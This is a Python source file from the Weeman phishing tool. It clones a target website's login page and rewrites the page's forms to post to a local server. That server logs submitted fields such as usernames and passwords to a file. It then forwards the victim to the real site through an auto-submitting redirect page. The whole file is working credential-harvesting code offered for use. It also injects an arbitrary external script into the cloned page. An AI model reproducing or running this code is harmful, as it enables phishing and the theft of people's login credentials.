#
# httpd.py - the main httpd server
#
# This file is part of weeman project, modified by Catayao56.
#
# See 'LICENSE' file for copying
#

import http.server
import socketserver
import urllib.request, urllib.error, urllib.parse
import cgi
import os, sys
import time
from socket import error as socerr
from bs4 import BeautifulSoup as bs

__version__ = '1.7.1'
__codename__ = 'extended'
__url__ = ""
__port__ = ""
__action_url__ = ""

def printt(s, msg):

    if s == 1:
        print("\033[01;31mError: %s\033[00m")
        sys.exit(1)

    elif s == 2:
        print(("[%s]\033[01;32m %s\033[00m" %(time.strftime("%H:%M:%S"),msg)))

    elif s == 3:
        print(("\033[01;37m[%s] %s\033[00m" %(time.strftime("%H:%M:%S"),msg)))

    else:
        print(("\033[01;37m[%s] %s\033[00m" %(time.strftime("%H:%M:%S"),msg)))

class handler(http.server.SimpleHTTPRequestHandler):
    ## Set server version
    server_version = "Weeman %s (%s)" %(__version__, __codename__)
    """
        Log message handler for simple HTTP server.
    """

    def do_POST(self, url=__url__, action_url=__action_url__):
        post_request = []
        printt(3, "%s - sent POST request." %self.address_string())
        form = cgi.FieldStorage(self.rfile,
        headers=self.headers,
        environ={'REQUEST_METHOD':'POST',
                 'CONTENT_TYPE':self.headers['Content-Type'],})
        try:
            
            logger = open("%s.log" %url.replace("https://", "").replace("http://", "").split("/")[0], "a")
            logger.write("\n## %s - Data for %s\n\n" %(time.strftime("%H:%M:%S - %d/%m/%y"), url))
            
            for tag in form.list:
                tmp = str(tag).split("(")[1]
                key,value = tmp.replace(")", "").replace("\'", "").replace(",", "").split()
                post_request.append("%s %s" %(key,value))
                printt(2, "%s => %s" %(key,value))
                logger.write("%s => %s\n" %(key,value))
            logger.close()
            
            create_post(url,action_url, post_request)
            http.server.SimpleHTTPRequestHandler.do_GET(self)
        
        except socerr as e:
            printt(3, "%s ignoring ..." %str(e))

        except Exception as e:
            printt(3, "%s ignoring ..." %str(e))

    def log_message(self, format, *args):
        
        arg = format%args
        if arg.split()[1] == "/":
            printt(3, "%s - sent GET request without parameters." %self.address_string())

        else:
            if arg.split()[1].startswith("/") and "&" in arg.split()[1]:
                printt(3, "%s - sent GET request with parameters." %self.address_string())
                printt(2, "%s" %arg.split()[1])

class weeman(object):
    """
        weeman Object 
    """

    def __init__(self, url,port):
        
        self.port = port
        self.httpd = None
        self.url = url
        self.form_url = None;

    def request(self,url, user_agent="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36"):
        """
            Send request to the http server.
        """
        
        opener = urllib.request.build_opener()
        opener.addheaders = [('User-Agent', user_agent),
                ("Accept", "text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1"),
                #("Accept-Language","en-US,en;q=0.9,en;q=0.8"),
                #("Accept-Encoding", "gzip;q=0,deflate,sdch"),
                #("Accept-Charset", "ISO-8859-2,utf-8;q=0.7,*;q=0.7"),
                ("Keep-Alive", "115"),
                ("Connection", "keep-alive"),
                ("DNT", "1")]
        return opener.open(self.url).read()

    def clone(self, html_file="", external_js=""):

        if not html_file:
            printt(3, "Trying to get %s  ..." %self.url)
            printt(3, "Downloading webpage ...")
            data = self.request(self.url)
        else:
            printt(3, "Loading \'%s\' ..." %html_file)
            data = open(html_file, "r").read()

        data = bs(data, "html.parser")
        printt(3, "Modifying the HTML file ...")

        for tag in data.find_all("form"):
            tag['method'] = "post"
            tag['action'] = "redirect.html"

        # Replace path with full path with the URL
        for tag in data.find_all("a"):
            pass

        # Insert external script
        script = data.new_tag('script', src=external_js)
        data.html.head.insert(len(data.html.head), script)
        
        with open("index.html", "w") as index:
            index.write(data.prettify())#.encode('utf-8'))
            index.close()

    def serve(self):
        print(("\033[01;35m[i] Starting Weeman %s server on http://localhost:%s\033[00m" %(str(__version__), self.port)))
        try:
            self.port = int(self.port)
            self.httpd = socketserver.TCPServer(("", self.port),handler)
            self.httpd.serve_forever()

        except ConnectionResetError:
            print("[i] ConnectionResetError exception catched... Maybe a scan?")

    def cleanup(self):
        
        if os.path.exists("index.html"):
            printt(3, "\n[i] Running cleanup ...")
            os.remove("index.html")
        if os.path.exists("redirect.html"):
            os.remove("redirect.html")

def create_post(url,action_url, post_request):
    """
        Create the page that will reidrect to the orignal page.
    """
    
    printt(3, "Creating redirect.html ...")
    
    with open("redirect.html","w") as r:
        r.write("<body><form id=\"firefox\" action=\"%s\" method=\"post\" >\n" %action_url)
        for post in post_request:
            key,value = post.split()
            r.write("<input name=\"%s\" value=\"%s\" type=\"hidden\" >\n" %(key,value))
        r.write("<input name=\"login\" type=\"hidden\">")
        r.write("<script type=\"text/javascript\">document.forms[\"firefox\"].submit();</script>")
    r.close()

def main():
    try:
        print('Interactive module for Weeman HTTPd')
        print(('version: %s %s' % (__version__, __codename__)))
        url = input("URL: ")
        port = input("Port: ")
        action_url = input("Action URL: ")
        __url__ = url
        __port__ = port
        __action_url__ = action_url
        s = weeman(url, port)
        s.clone()
        s.serve()

    except KeyboardInterrupt:
        s = weeman(url, port)
        s.cleanup()
        print("CTRL+C Detected...")
        sys.exit(1)

    except Exception as e:
        printt(3, "Error: (%s)" %(str(e)))

if __name__ == '__main__':
    main()
